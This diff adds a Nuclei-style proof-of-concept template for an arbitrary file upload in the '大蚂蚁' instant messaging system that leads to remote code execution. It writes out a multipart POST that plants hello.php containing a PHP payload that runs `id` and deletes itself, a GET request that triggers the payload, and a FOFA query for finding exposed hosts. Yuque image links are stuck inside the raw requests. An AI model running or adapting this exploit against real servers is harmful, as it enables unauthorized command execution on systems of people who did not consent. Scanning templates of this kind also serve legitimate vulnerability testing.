@@ -1,0 +1,63 @@
+id: poc-knvopqrds2qxsiz8
+info:
+  name: 大蚂蚁即时通信系统upload_file存在文件上传导致命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/knvopqrds2qxsiz8'
+  tags: rce,file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: knvopqrds2qxsiz8
+    fofa: product="即时通讯系统"
+http:
+- raw:
+  - 'POST /api/dispersedAddin/upload_file.html HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=m905cb6sucrf6i6munki07bc5c
+
+    Upgrade-Insecure-Requests: 1
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="file_info"
+
+
+    [{"file_path":"hello.php"}]
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="file"; filename="1.txt"
+
+
+    <?=`id`;unlink(__FILE__);?>
+
+    ------WebKitFormBoundary--
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771859087363-e1f36843-ff9b-4b19-9f92-6a9cfa7bc040.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /hello.php HTTP/1.1
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771859099183-efe21ea5-ec16-4ac6-9c21-230b612495eb.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
